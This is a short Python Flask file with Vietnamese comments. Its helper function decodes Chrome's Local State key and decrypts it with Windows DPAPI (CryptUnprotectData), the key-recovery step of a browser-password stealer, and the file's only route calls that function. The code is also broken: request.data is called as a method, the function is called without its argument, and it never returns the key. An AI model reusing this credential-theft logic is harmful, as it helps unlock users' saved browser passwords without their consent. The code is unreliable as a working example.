from flask import Flask, render_template, request
import base64
import json
import win32crypt
import socket

# Khởi tạo ứng dụng Flask
app = Flask(__name__)


def get_secret_key(base_64_string):
    try:
        # (1) Get secretkey from chrome local state

        secret_key = base64.b64decode(base_64_string)
        print(secret_key)
        # Remove suffix DPAPI
        secret_key = secret_key[5:]
        secret_key = win32crypt.CryptUnprotectData(secret_key, None, None, None, 0)[1]
        print(secret_key)
    except Exception as e:
        print("%s" % str(e))
        print("[ERR] Chrome secretkey cannot be found")
        return None


# Định nghĩa route cơ bản
@app.route("/")
def hello():
    data = request.data()
    get_secret_key()
    return "Hello, World!"


# Khởi chạy ứng dụng
if __name__ == "__main__":
    app.run(debug=True)
